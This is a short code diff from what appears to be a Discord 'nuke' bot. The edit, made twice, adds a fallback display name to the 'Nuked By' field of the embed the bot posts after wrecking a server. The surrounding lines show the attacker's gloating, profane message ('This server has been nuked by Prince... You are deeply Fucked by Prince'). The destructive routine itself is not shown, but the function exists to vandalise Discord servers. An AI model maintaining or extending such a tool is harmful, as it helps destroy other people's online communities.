@@ -322,7 +322,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
       `This server has been nuked by Prince, Prince was Here!!!`,
       [
         { name: 'Channel Name', value: channelName, inline: false },
-        { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
+        { name: 'Nuked By', value: executor.tag || executor.globalName || executor.username, inline: false },
         { name: 'Timestamp', value: timestampStr, inline: false }
       ],
       'You are deeply Fucked by Prince <a:JL_crown_blue_star:1543509576232730678>'
@@ -354,7 +354,7 @@ async function executeNuke(guild, executor, mode, channelCount, channelName) {
       `This server has been nuked by Prince, Prince was Here !!!`,
       [
         { name: 'Channel Name', value: channelName, inline: false },
-        { name: 'Nuked By', value: executor.tag || executor.username, inline: false },
+        { name: 'Nuked By', value: executor.tag || executor.globalName || executor.username, inline: false },
         { name: 'Timestamp', value: timestampStr, inline: false }
       ],
       'You are deeply Fucked by Prince <a:JL_crown_blue_star:1543509576232730678>'
